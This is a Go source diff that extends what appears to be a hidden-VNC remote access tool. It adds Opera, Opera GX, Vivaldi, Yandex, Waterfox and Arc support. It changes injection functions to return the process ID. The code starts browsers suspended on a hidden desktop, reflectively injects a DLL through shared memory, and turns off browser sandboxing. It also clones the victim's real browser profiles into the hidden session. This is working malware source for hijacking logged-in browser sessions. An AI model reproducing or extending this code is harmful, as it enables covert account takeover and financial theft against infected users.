@@ -102,12 +102,12 @@ func enableDebugPrivilege() {
 // StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
+func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
 	if filePath == "" {
-		return fmt.Errorf("empty file path")
+		return 0, fmt.Errorf("empty file path")
 	}
 	if len(dllBytes) == 0 {
-		return fmt.Errorf("empty DLL bytes")
+		return 0, fmt.Errorf("empty DLL bytes")
 	}
 
 	result, err := executeHVNCTask(hvncTask{
@@ -119,9 +119,9 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 		replacePath:     replacePath,
 	}, 30*time.Second)
 	if err != nil {
-		return err
+		return 0, err
 	}
-	return result.err
+	return result.pid, result.err
 }
 
 // StartHVNCBrowserInjected starts a browser on the HVNC desktop with injection.
@@ -158,7 +158,14 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 	if !clone {
 		log.Printf("hvnc %s: starting without profile cloning", info.name)
-		return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
+		pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
+		if err != nil {
+			return err
+		}
+		if info.needsPatch && pid != 0 {
+			go patchOperaAsync(pid, 5, 2*time.Second)
+		}
+		return nil
 	}
 
 	realUserData := getBrowserUserDataDir(info)
@@ -195,7 +202,14 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		}
 	}
 
-	return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
+	pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
+	if err != nil {
+		return err
+	}
+	if info.needsPatch && pid != 0 {
+		go patchOperaAsync(pid, 5, 2*time.Second)
+	}
+	return nil
 }
 
 // StartHVNCChromeInjected is kept for backward compatibility.
@@ -204,12 +218,14 @@ func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes
 }
 
 type browserInfo struct {
-	name       string
-	exeName    string
-	exePaths   []string // candidate exe locations (env vars expanded at runtime)
-	userData   string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
-	useAppData bool     // true = use APPDATA instead of LOCALAPPDATA
-	isFirefox  bool     // true for Firefox (different profile structure)
+	name        string
+	exeName     string
+	exePaths    []string // candidate exe locations (env vars expanded at runtime)
+	userData    string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
+	useAppData  bool     // true = use APPDATA instead of LOCALAPPDATA
+	isFirefox   bool     // true for Firefox (different profile structure)
+	flatProfile bool     // true = no Default/Profile subdirs; treat all root dirs as profile content
+	needsPatch  bool     // true = apply GetCursorInfo patch after launch (Opera/Opera GX)
 }
 
 var browserInfoMap = map[string]browserInfo{
@@ -247,6 +263,70 @@ var browserInfoMap = map[string]browserInfo{
 		useAppData: true,
 		isFirefox:  true,
 	},
+	"opera": {
+		name:    "Opera",
+		exeName: "opera.exe",
+		exePaths: []string{
+			`\Programs\Opera\opera.exe`,
+		},
+		userData:    `Opera Software\Opera Stable`,
+		useAppData:  true,
+		flatProfile: true,
+		needsPatch:  true,
+	},
+	"operagx": {
+		name:    "Opera GX",
+		exeName: "opera.exe",
+		exePaths: []string{
+			`\Programs\Opera GX\opera.exe`,
+		},
+		userData:    `Opera Software\Opera GX Stable`,
+		useAppData:  true,
+		flatProfile: true,
+		needsPatch:  true,
+	},
+	"vivaldi": {
+		name:    "Vivaldi",
+		exeName: "vivaldi.exe",
+		exePaths: []string{
+			`\Vivaldi\Application\vivaldi.exe`,
+		},
+		userData: `Vivaldi\User Data`,
+	},
+	"yandex": {
+		name:    "Yandex",
+		exeName: "browser.exe",
+		exePaths: []string{
+			`\Yandex\YandexBrowser\Application\browser.exe`,
+		},
+		userData: `Yandex\YandexBrowser\User Data`,
+	},
+	"waterfox": {
+		name:    "Waterfox",
+		exeName: "waterfox.exe",
+		exePaths: []string{
+			`\Waterfox\waterfox.exe`,
+		},
+		userData:   `Waterfox`,
+		useAppData: true,
+		isFirefox:  true,
+	},
+	"arc": {
+		name:    "Arc",
+		exeName: "Arc.exe",
+		exePaths: []string{
+			`\Arc\Application\Arc.exe`,
+		},
+		userData: `Arc\User Data`,
+	},
+}
+
+func CheckInstalledBrowsers() map[string]bool {
+	result := make(map[string]bool, len(browserInfoMap))
+	for key, info := range browserInfoMap {
+		result[key] = findBrowserExe(info) != ""
+	}
+	return result
 }
 
 func findBrowserExe(info browserInfo) string {
@@ -465,11 +545,13 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		jobs = append(jobs, copyJob{src: src, dst: dst})
 	}
 
-	// Get browser info to check if it's Firefox
+	// Get browser info to check profile structure
 	isFirefox := false
+	flatProfile := false
 	for _, bi := range browserInfoMap {
 		if strings.EqualFold(bi.name, browserName) {
 			isFirefox = bi.isFirefox
+			flatProfile = bi.flatProfile
 			break
 		}
 	}
@@ -480,20 +562,24 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		dst := filepath.Join(cloneBase, name)
 
 		if entry.IsDir() {
-			// Check if this is a profile directory
-			isProfile := false
-			if isFirefox {
-				// Firefox profiles have names like "xxxxx.default-release"
-				isProfile = isFirefoxProfile(name)
-			} else {
-				// Chrome-based browsers use "Default" or "Profile X"
-				isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
-			}
-
-			if isProfile {
+			if flatProfile {
 				collectProfileDir(src, dst, skipDirs, collectFile)
-			} else if !skipDirs[strings.ToLower(name)] {
-				collectDirFiles(src, dst, collectFile)
+			} else {
+				// Check if this is a profile directory
+				isProfile := false
+				if isFirefox {
+					// Firefox profiles have names like "xxxxx.default-release"
+					isProfile = isFirefoxProfile(name)
+				} else {
+					// Chrome-based browsers use "Default" or "Profile X"
+					isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+				}
+
+				if isProfile {
+					collectProfileDir(src, dst, skipDirs, collectFile)
+				} else if !skipDirs[strings.ToLower(name)] {
+					collectDirFiles(src, dst, collectFile)
+				}
 			}
 		} else {
 			collectFile(src, dst)
@@ -667,19 +753,19 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
+func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
 	if filePath == "" {
-		return fmt.Errorf("empty file path")
+		return 0, fmt.Errorf("empty file path")
 	}
 	if len(dllBytes) == 0 {
-		return fmt.Errorf("empty DLL bytes")
+		return 0, fmt.Errorf("empty DLL bytes")
 	}
 
 	// Create a page-file-backed named section containing the raw DLL bytes.
 	// Child processes will open this section to reflectively inject themselves.
 	shmHandle, shmName, err := createDLLSharedMemory(dllBytes)
 	if err != nil {
-		return fmt.Errorf("failed to create DLL shared memory: %v", err)
+		return 0, fmt.Errorf("failed to create DLL shared memory: %v", err)
 	}
 	log.Printf("hvnc inject: DLL shared memory created as %s (%d bytes)", shmName, len(dllBytes))
 
@@ -689,7 +775,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes))
 	if err != nil {
 		procCloseHandle.Call(shmHandle)
-		return fmt.Errorf("failed to create suspended process: %v", err)
+		return 0, fmt.Errorf("failed to create suspended process: %v", err)
 	}
 	log.Printf("hvnc inject: created suspended process PID %d", pid)
 
@@ -699,7 +785,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 		procCloseHandle.Call(hThread)
 		terminateProcess(hProcess)
 		procCloseHandle.Call(shmHandle)
-		return fmt.Errorf("DLL injection failed: %v", err)
+		return 0, fmt.Errorf("DLL injection failed: %v", err)
 	}
 	log.Printf("hvnc inject: DLL injected into PID %d", pid)
 
@@ -714,7 +800,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	ret, _, _ := procResumeThread.Call(hThread)
 	if ret == 0xFFFFFFFF {
 		procCloseHandle.Call(hThread)
-		return fmt.Errorf("failed to resume thread")
+		return 0, fmt.Errorf("failed to resume thread")
 	}
 	procCloseHandle.Call(hThread)
 
@@ -724,7 +810,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 		go hvncDeferredGPUInject(pid, captureDllBytes)
 	}
 
-	return nil
+	return pid, nil
 }
 
 func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
@@ -932,15 +1018,19 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
 	args := " --window-position=0,0"
-	browserExes := map[string]bool{
-		"chrome.exe": true,
-		"brave.exe":  true,
-		"msedge.exe": true,
+	chromiumExes := map[string]bool{
+		"chrome.exe":  true,
+		"brave.exe":   true,
+		"msedge.exe":  true,
+		"opera.exe":   true,
+		"vivaldi.exe": true,
+		"browser.exe": true,
+		"arc.exe":     true,
 	}
 	baseName := strings.ToLower(filepath.Base(filePath))
-	if browserExes[baseName] {
+	if chromiumExes[baseName] {
 		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu-sandbox"
-	} else if baseName == "firefox.exe" {
+	} else if baseName == "firefox.exe" || baseName == "waterfox.exe" {
 		args += " -no-remote -wait-for-browser"
 	}
 	cmdLine, err := syscall.UTF16FromString(filePath + args)
